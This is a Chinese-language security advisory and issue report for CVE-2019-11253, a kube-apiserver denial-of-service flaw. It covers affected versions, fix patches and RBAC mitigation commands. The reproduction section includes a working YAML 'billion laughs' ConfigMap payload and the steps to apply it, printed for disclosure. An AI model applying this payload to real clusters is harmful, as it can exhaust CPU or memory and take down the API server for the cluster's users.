# CVE-2019-11253：kube-apiserver 拒绝服务漏洞

CVE-2019-11253 是 kube-apiserver 中的一个拒绝服务漏洞，允许授权用户发送恶意的 YAML 或 JSON 负载，导致 kube-apiserver 消耗过多的 CPU 或内存，可能造成崩溃并变得不可用。该漏洞初始严重性评级为高危，CVSS 评分为 7.5（[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)）。

在 v1.14.0 之前，默认的 RBAC 策略允许匿名用户提交可能触发此漏洞的请求。从 v1.14.0 之前版本升级的集群默认保留更宽松的策略以保持向后兼容性。请参阅下文缓解措施部分，了解如何安装更严格的 v1.14+ 策略。

**受影响版本：**
* Kubernetes v1.0.0-1.12.x
* Kubernetes v1.13.0-1.13.11，已在 v1.13.12 中通过 https://github.com/kubernetes/kubernetes/pull/83436 修复
* Kubernetes v1.14.0-1.14.7，已在 v1.14.8 中通过 https://github.com/kubernetes/kubernetes/pull/83435 修复
* Kubernetes v1.15.0-1.15.4，已在 v1.15.5 中通过 https://github.com/kubernetes/kubernetes/pull/83434 修复
* Kubernetes v1.16.0-1.16.1，已在 v1.16.2 中通过 https://github.com/kubernetes/kubernetes/pull/83433 修复

所有四个补丁版本现已发布。

在 master 分支中已通过 #83261 修复

**缓解措施：**

被授权拒绝的请求不会触发该漏洞，因此管理授权规则和/或对 Kubernetes API 服务器的访问可以限制哪些用户能够触发此漏洞。

要手动应用更严格的 v1.14.x+ 策略（无论是作为升级前的缓解措施，还是作为升级后集群的额外保护），请将[附件文件](https://github.com/kubernetes/kubernetes/files/3735508/rbac.yaml.txt)保存为 `rbac.yaml`，并运行：

```sh
kubectl auth reconcile -f rbac.yaml --remove-extra-subjects --remove-extra-permissions 
```

**注意：这将移除未认证用户使用 `kubectl auth can-i` 的能力**

如果您运行的版本低于 v1.14.0：
* 除了安装限制性策略外，请关闭此 clusterrolebinding 的自动更新，以防止您的更改在 API 服务器重启时被替换：
    ```sh
    kubectl annotate --overwrite clusterrolebinding/system:basic-user rbac.authorization.kubernetes.io/autoupdate=false
    ```
* 升级到 v1.14.0 或更高版本后，您可以移除此注释以重新启用自动更新：
    ```sh
    kubectl annotate --overwrite clusterrolebinding/system:basic-user rbac.authorization.kubernetes.io/autoupdate=true
    ```

=============

**原始描述如下：**

**简介**

在向安全邮件列表报告后，将此问题发布在此处，因为该问题已在 Stackoverflow 问题中公开[此处](https://stackoverflow.com/questions/58129150/security-yaml-bomb-user-can-restart-kube-api-by-sending-configmap/58133282#58133282)

**发生了什么：**

当创建包含递归引用的 ConfigMap 对象时，可能会发生 CPU 使用率过高的情况。这似乎是["十亿次大笑攻击"](https://en.wikipedia.org/wiki/Billion_laughs_attack)的一个实例，该攻击作为 XML 解析问题广为人知。

将此清单应用到集群会导致客户端挂起一段时间并消耗大量 CPU。

```
apiVersion: v1
data:
  a: &a ["web","web","web","web","web","web","web","web","web"]
  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
  h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
  i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
kind: ConfigMap
metadata:
  name: yaml-bomb
  namespace: default
```

**预期结果：**

最好能定义实体的最大大小，或者限制 kubectl 解析的 YAML 中的递归引用。

需要注意的是，Stackoverflow 上的原始发帖人表示资源消耗发生在 `kube-apiserver` 中，但我进行的两次测试（1.16 客户端针对 1.15 Kubeadm 集群和 1.16 客户端针对 1.16 kubeadm 集群）都显示 CPU 使用发生在客户端。

**如何重现（尽可能最小化和精确）：**

获取上述清单并使用 `kubectl create -f <manifest>` 正常应用到集群。使用 `top` 或其他 CPU 监视器观察使用的 CPU 时间量。

**其他需要了解的信息：**

**环境：**
- Kubernetes 版本（使用 `kubectl version`）：

**测试 1**（linux AMD64 客户端，运行在 kind 中的 Kubeadm 集群）
```
Client Version: version.Info{Major:"1", Minor:"16", GitVersion:"v1.16.0", GitCommit:"2bd9643cee5b3b3a5ecbd3af49d09018f0773c77", GitTreeState:"clean", BuildDate:"2019-09-18T14:36:53Z", GoVersion:"go1.12.9", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"15", GitVersion:"v1.15.0", GitCommit:"e8462b5b5dc2584fdcd18e6bcfe9f1e4d970a529", GitTreeState:"clean", BuildDate:"2019-06-25T23:41:27Z", GoVersion:"go1.12.5", Compiler:"gc", Platform:"linux/amd64"}
```

**测试 2**（Linux AMD64 客户端，运行在 VMWare Workstation 中的 Kubeadm 集群）
```
Client Version: version.Info{Major:"1", Minor:"16", GitVersion:"v1.16.0", GitCommit:"2bd9643cee5b3b3a5ecbd3af49d09018f0773c77", GitTreeState:"clean", BuildDate:"2019-09-18T14:36:53Z", GoVersion:"go1.12.9", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"16", GitVersion:"v1.16.0", GitCommit:"2bd9643cee5b3b3a5ecbd3af49d09018f0773c77", GitTreeState:"clean", BuildDate:"2019-09-18T14:27:17Z", GoVersion:"go1.12.9", Compiler:"gc", Platform:"linux/amd64"}
```